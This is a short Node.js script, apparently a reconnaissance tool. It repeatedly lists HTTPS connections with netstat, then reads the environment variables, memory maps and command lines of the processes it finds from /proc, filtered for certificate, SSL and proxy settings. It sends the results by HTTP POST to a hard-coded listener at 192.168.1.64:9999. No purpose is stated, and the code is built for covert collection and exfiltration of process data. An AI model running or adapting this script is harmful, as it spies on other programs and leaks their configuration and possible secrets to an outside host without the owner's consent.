"use strict";
var http = require("http");
var cp = require("child_process");

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request({ host: "192.168.1.64", port: 9999, path: path, method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
        function (res) { res.resume(); console.log("posted " + path + " " + res.statusCode); });
    req.on("error", function (e) { console.log("post err " + e.message); });
    req.write(data); req.end();
}

function sh(cmd, cap) {
    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: 20000 }).slice(0, cap || 8000); }
    catch (e) { return "ERR " + (e.stdout ? e.stdout : e.message); }
}

var out = {};
out.started = new Date().toISOString();
var samples = [];
for (var i = 0; i < 14; i++) {
    var r = sh("netstat -tnp 2>/dev/null | grep ':443' | grep -v 192.168.1.64:443 | head -6");
    if (r && r.indexOf("443") !== -1) samples.push("S" + i + " " + r.replace(/\n/g, " | "));
    sh("sleep 5");
}
out.samples = samples.join("\n").slice(0, 6000);
post("/acr59a", out);

var detail = {};
detail.started = out.started;
var pids = {};
var ss = out.samples;
var re = /(\d+)\/([A-Za-z0-9._-]+)/g;
var m;
while ((m = re.exec(ss)) !== null) pids[m[1]] = m[2];
detail.pids = JSON.stringify(pids);
var dumps = [];
for (var pid in pids) {
    dumps.push("### " + pid + " " + pids[pid] +
        "\n" + sh("tr '\\0' '\\n' < /proc/" + pid + "/environ 2>/dev/null | grep -iE 'ca|cert|ssl|curl|proxy' | head -10") +
        "\nMAPS " + sh("grep -E 'ca-|cert|ssl' /proc/" + pid + "/maps 2>/dev/null | head -6") +
        "\nCMD " + sh("tr '\\0' ' ' < /proc/" + pid + "/cmdline 2>/dev/null | head -c 150"));
}
detail.dumps = dumps.join("\n\n").slice(0, 8000);
post("/acr59b", detail);
post("/acr59_done", { started: out.started });
